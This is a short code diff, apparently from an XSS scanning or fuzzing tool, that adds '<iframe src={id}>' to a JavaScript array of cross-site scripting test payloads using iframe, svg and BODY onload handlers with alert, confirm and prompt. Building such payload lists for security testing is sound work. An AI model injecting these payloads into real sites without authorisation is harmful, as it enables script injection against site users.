@@ -35,6 +35,7 @@ const payload = [
     "<svg><style>{font-family&colon;'<iframe/onload=confirm({id})>'",
     'svg / onload = alert({id})',
     '<iframe/src \/\/onload = prompt({id})',
+    '<iframe src={id}>',
     '<iframe  src="&Tab;javascript:prompt({id})&Tab;">',
     "<BODY ONLOAD=alert({id})>",
     '<BODY ONLOAD=javascript:alert({id})>',
